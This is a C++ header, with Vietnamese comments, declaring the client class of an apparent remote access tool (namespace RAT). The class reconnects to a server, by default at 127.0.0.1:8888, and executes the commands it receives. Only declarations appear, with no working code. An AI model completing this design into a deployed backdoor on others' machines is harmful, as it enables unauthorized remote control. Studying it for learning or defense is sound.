#pragma once

#include "protocol.h"
#include "socket_utils.h"

#include <string>

namespace RAT
{
    class Client
    {
    public:
        // Khởi tạo Client với host và port
        explicit Client(const std::string &host = DEFAULT_HOST, int port = DEFAULT_PORT);
        ~Client();

        // Khởi động và Kết nối tới Server
        void start();

        // Ngắt kết nối và giải phóng tài nguyên
        void stop();

    private:
        // Kết nối đến Server (tự động thử lại nếu Server chưa mở)
        bool connect_to_server();

        // Phân tích và thực thi tương ứng
        std::string execute_command(const std::string &raw_cmd);

        std::string server_host_; // Địa chỉ IP của Server (mặc định 127.0.0.1)
        int server_port_;         // Port của Server (mặc định 8888)

        socket_t sock_fd_;        // Socket kết nối tới Server
        bool is_running_;         // Cờ kiểm soát vòng lặp hoạt động
    };
}